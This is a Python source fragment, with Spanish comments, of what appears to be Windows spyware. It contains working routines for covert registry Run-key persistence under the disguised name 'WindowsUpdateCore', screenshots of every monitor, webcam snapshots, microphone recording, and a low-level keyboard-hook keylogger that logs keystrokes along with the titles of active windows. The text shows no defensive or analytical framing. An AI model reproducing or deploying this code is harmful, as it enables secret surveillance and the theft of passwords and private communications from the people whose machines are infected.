# --- RUTINA DE PERSISTENCIA (AUTO-INICIO) CON CTYPES ---
def set_silent_persistence():
    """Crea persistencia en el registro de Windows usando ctypes."""
    try:
        # Nombre que aparecerá en el registro (debe sonar legítimo)
        app_name = "WindowsUpdateCore" 
        exe_path = sys.executable

        # Acceso a la API de Registro
        advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
        
        # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        HKEY_CURRENT_USER = 0x80000001
        KEY_WRITE = 0x20006
        REG_SZ = 1

        phk_result = wintypes.HANDLE()
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

        # 1. Abrir la clave del registro
        if advapi32.RegOpenKeyExW(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, ctypes.byref(phk_result)) == 0:
            # 2. Establecer el valor (ruta del exe)
            advapi32.RegSetValueExW(phk_result, app_name, 0, REG_SZ, exe_path, (len(exe_path) + 1) * 2)
            # 3. Cerrar la clave
            advapi32.RegCloseKey(phk_result)
            return True
    except Exception:
        pass
    return False

# --- LÓGICA DE CAPTURA PANTALLA CON CTYPES ---

import mss
import mss.tools

def capture_multiple_screens():
    """Detecta monitores y captura cada uno por separado."""
    captured_paths = []
    with mss.mss() as sct:
        # Detectamos cuántos monitores hay (sct.monitors[0] es el total)
        monitors = sct.monitors
        
        if len(monitors) <= 1:
            return None # No se detectaron monitores físicos individuales

        # Iteramos desde el 1 hasta el final
        for i in range(1, len(monitors)):
            filename = f"monitor_{i}_{datetime.now().strftime('%H%M%S')}.png"
            output = os.path.join(os.getenv('APPDATA'), filename)
            
            # Captura específicamente el monitor 'i'
            sct_img = sct.grab(monitors[i])
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=output)
            
            captured_paths.append((i, output))
            
    return captured_paths



# --- LÓGICA DE CAPTURA CAMARA CON CTYPES ---
def capture_cam():
    """Captura imagen de la cámara usando ctypes y OpenCV."""
    try:
        # Usar DirectShow a través de ctypes para capturar de la cámara
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            cap.release()
            return io.BytesIO(buffer)
        cap.release()
    except Exception as e:
        print(f"Error al capturar cámara: {e}")
    return None

# --- LÓGICA DE CAPTURA DE AUDIO CON CTYPES ---
import math # Necesario para redondear hacia arriba

def capture_audio(duration=15):
    """Graba audio del micrófono asegurando la duración exacta."""
    try:
        sample_rate = 44100
        channels = 1
        format = pyaudio.paInt16
        chunk = 1024
        
        filename = os.path.join(os.getenv('APPDATA'), "temp_audio.wav")
        audio = pyaudio.PyAudio()
        
        stream = audio.open(format=format, channels=channels, 
                           rate=sample_rate, input=True,
                           frames_per_buffer=chunk)
        
        frames = []
        
        # CORRECCIÓN 1: math.ceil asegura que no perdamos fragmentos por redondeo
        # CORRECCIÓN 2: Añadimos un pequeño margen de 0.2s para compensar el inicio del hardware
        total_chunks = math.ceil((sample_rate / chunk) * (duration + 0.2))
        
        for i in range(0, total_chunks):
            # CORRECCIÓN 3: exception_on_overflow=False evita pausas si el PC se pone lento
            data = stream.read(chunk, exception_on_overflow=False)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        
        # Guardar archivo
        wf = wave.open(filename, 'wb')
        wf.setnchannels(channels)
        # Importante: Obtener el tamaño de muestra antes de terminar audio
        sample_size = audio.get_sample_size(format)
        wf.setsampwidth(sample_size)
        wf.setframerate(sample_rate)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        audio.terminate()
        return filename
        
    except Exception as e:
        print(f"Error al grabar audio: {e}")
        return None


# --- KEYLOGGER CON CTYPES ---
def low_level_keyboard_handler(nCode, wParam, lParam):
    """Manejador del hook de teclado de bajo nivel corregido."""
    global last_window
    
    if nCode >= 0:
        if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            kb_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            vk_code = kb_struct.vkCode
            
            # 1. Obtener ventana activa actual (Cabecera)
            hwnd = user32.GetForegroundWindow()
            if hwnd != last_window:
                last_window = hwnd
                window_title_length = user32.GetWindowTextLengthW(hwnd) + 1
                window_title = ctypes.create_unicode_buffer(window_title_length)
                user32.GetWindowTextW(hwnd, window_title, window_title_length)
                
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f"\n\n[Ventana: {window_title.value} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            
            # 2. PROCESAR TECLA (Lógica mejorada)
            key_str = ""
            
            # Diccionario extendido de teclas especiales
            special_keys = {
                8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]\n", 20: "[CAPSLOCK]", 
                27: "[ESC]", 32: " ", 46: "[DELETE]", 160: "[LSHIFT]", 
                161: "[RSHIFT]", 162: "[LCTRL]", 163: "[RCTRL]", 164: "[LALT]", 
                165: "[RALT]", 91: "[LWIN]", 92: "[RWIN]"
            }

            if vk_code in special_keys:
                key_str = special_keys[vk_code]
            else:
                # Detectar estado de SHIFT y CAPS LOCK para minúsculas/mayúsculas
                shift = (user32.GetKeyState(0x10) & 0x8000) != 0
                caps = (user32.GetKeyState(0x14) & 1) != 0
                
                try:
                    # Convertir código a carácter
                    char = chr(vk_code)
                    # Si SHIFT y CAPS están activos, se anulan (XOR)
                    if shift ^ caps:
                        key_str = char.upper()
                    else:
                        key_str = char.lower()
                except:
                    key_str = f"[{vk_code}]"

            # 3. Escribir en archivo de log
            if key_str and key_str != "[CAPSLOCK]":
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(key_str)
    
    # IMPORTANTE: Asegurar que el retorno sea compatible con LPARAM
    res = user32.CallNextHookEx(None, nCode, wParam, lParam)
    return ctypes.wintypes.LPARAM(res).value

# --- CONFIGURACIÓN DEL HOOK ---
CMPFUNC = ctypes.WINFUNCTYPE(ctypes.wintypes.LPARAM, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
hook_proc = CMPFUNC(low_level_keyboard_handler)

user32.SetWindowsHookExA.argtypes = [
    ctypes.c_int, 
    ctypes.c_void_p, 
    ctypes.wintypes.HINSTANCE, 
    ctypes.wintypes.DWORD
]
user32.SetWindowsHookExA.restype = ctypes.wintypes.HHOOK

# Instalación usando cast para asegurar compatibilidad
hook = user32.SetWindowsHookExA(13, ctypes.cast(hook_proc, ctypes.c_void_p), kernel32.GetModuleHandleW(None), 0)

def start_keylogger():
    
    global hook, hook_proc
    
    # 1. Warm-up: Abre el archivo una vez para que el sistema operativo esté listo
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n--- Sesión iniciada: {datetime.now()} ---\n")

    # 2. Definir hook_proc como global para que el Garbage Collector no lo borre
    # Usamos wintypes.LPARAM para el retorno (compatible con 64 bits)
    HOOK_TYPE = ctypes.WINFUNCTYPE(ctypes.wintypes.LPARAM, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
    hook_proc = HOOK_TYPE(low_level_keyboard_handler)
    
    WH_KEYBOARD_LL = 13
    h_module = kernel32.GetModuleHandleW(None)
    
    # 3. Instalar Hook
    hook = user32.SetWindowsHookExA(
        WH_KEYBOARD_LL, 
        ctypes.cast(hook_proc, ctypes.c_void_p), 
        h_module, 
        0
    )
    
    msg = wintypes.MSG()
    while user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageA(ctypes.byref(msg))

